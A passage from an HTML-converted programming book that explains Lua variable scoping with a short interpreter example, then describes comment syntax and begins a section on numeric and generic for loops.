class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print(vara)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >varb =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >5</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >b()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local vara =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.2000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >2</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print(vara)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >varb =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >10</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:15.3500pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >a() -- this will execute function a() & variable b gets set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.4500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >to 5</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:382.3500pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >print(varb) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >5</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:15.3500pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >b() -- this will execute function b() & variable b gets set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.4500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >to 10</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.6000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >2</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:36.9500pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print(vara) -- this prints local variable a, outside of</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >the block,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:338.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- resulting in nil nil</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:22.5500pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print(varb) -- this prints global variable b, resulting in</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.5000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >10 10</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section325" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:10.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The preceding code shows examples of scoping local and global variables. Again, in Lua variables are global by default. Only when you want a variable to <a name="_bookmark613" ></a>be local do you need to specify. You see the preceding script prints to screen the values set for variable </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >a </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and variable </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >b</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The values for the variables are printed at several points to demonstrate how they change, depending on the function executed and whether the variable was global or local in scope.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.2500pt;margin-right:9.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For example, note when function </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >a()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is executed, the local variable </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >a</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is set to a value of </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1 </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and printed. Then global variable </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >b </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is set to </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >5</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Then the script prints &#8220;variable </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >b</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.3000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8211; with an output of 5.&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When function </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >b()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is executed, the local variable </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >a</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is set to a value of </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >2 </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and printed. Then global variable </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >b </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is set to </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >10</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Then the script prints variable </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >a</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, but the output is nil, because variable </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >a</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >was a local variable. Lastly, the script prints &#8220;variable </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >b</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, with an output of 10.&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Comments in Lua start with </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. This comments the rest of the line. Some examples of this are seen in the previous block of code. You can also comment out whole sections of code with </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--[[ </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and then terminated by </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >]]</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:14.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Loops</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Loops in Lua work the way you would expect (if you have prior programming experience). Parentheses around the expression are optional. If you use just a value or a function as the expression instead of a comparison, keep in mind that all values evaluate to </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >true </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >except for </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >nil </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >false</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. A loop is delimited by a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >do-end </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >block except for the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >repeat </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop, which has an implicit start of the chunk and is ended by the keyword </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >until</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:15.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Lua contains two types of </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loops. The </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop that most languages implement is called the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >numeric for </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and another kind is called the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >generic for</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The numeric </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop makes it easier to generate one of the common </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop constructs, where a variable is initialized to a number and incremented until a given other number&#8212;that is, count from 11 to 20, as shown in the following example. The numeric </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section326" ><p class=MsoBodyText  style="margin-top:3.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >makes the same loop shorter and easier to write, as demonstrated in the 21 to 30 </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.2000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop using the numeric style.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.2000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The generic </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for 